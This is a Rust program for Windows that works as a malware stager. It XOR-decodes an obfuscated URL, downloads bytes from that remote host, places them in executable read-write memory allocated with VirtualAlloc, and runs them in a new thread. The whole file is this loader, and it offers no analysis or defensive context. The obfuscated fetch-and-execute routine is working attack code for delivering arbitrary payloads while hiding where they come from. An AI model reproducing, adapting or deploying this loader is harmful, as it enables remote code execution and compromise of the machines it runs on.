use std::ptr::null_mut;
use std::ffi::c_void;
use winapi::um::winnt::{HANDLE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use winapi::um::processthreadsapi::{CreateThread};
use winapi::um::memoryapi::{VirtualAlloc, VirtualFree};
use winapi::um::winbase::INFINITE;
use winapi::um::synchapi::WaitForSingleObject;
use reqwest::blocking::get;

/// XOR-based string decryption
fn decode_string(enc: &[u8], key: u8) -> String {
    enc.iter().map(|&c| (c ^ key) as char).collect()
}

unsafe extern "system" fn payload_entry(_: *mut c_void) -> u32 {
    // Obfuscated URL
    let url_enc: [u8; 35] = [ 
        0x5D, 0x7E, 0x78, 0x68, 0x6F, 0x25, 0x63, 0x66, 0x71, 0x78, 
        0x7F, 0x78, 0x2F, 0x73, 0x64, 0x67, 0x2D, 0x63, 0x71, 0x7B, 
        0x75, 0x7D, 0x62, 0x7B, 0x26, 0x78, 0x74, 0x7D, 0x75, 0x76, 
        0x7C, 0x75, 0x76, 0x2E, 0x63
    ];
    let key = 0x13; // XOR key
    let url = decode_string(&url_enc, key);

    // Download executable payload
    let response = get(&url).expect("Failed to fetch file");
    let bytes = response.bytes().expect("Failed to read bytes");

    // Memory allocation and execution
    let alloc_size = bytes.len();
    let exec_mem = VirtualAlloc(
        null_mut(),
        alloc_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    if exec_mem.is_null() {
        panic!("Memory allocation failed.");
    }

    std::ptr::copy_nonoverlapping(bytes.as_ptr(), exec_mem as *mut u8, alloc_size);

    let thread = CreateThread(
        null_mut(),
        0,
        Some(std::mem::transmute(exec_mem)),
        null_mut(),
        0,
        null_mut(),
    );

    if thread.is_null() {
        panic!("Thread creation failed.");
    }

    WaitForSingleObject(thread, INFINITE);
    VirtualFree(exec_mem, alloc_size, 0x8000); // MEM_RELEASE
    0
}

fn main() {
    unsafe {
        let _ = payload_entry(null_mut());
    }
}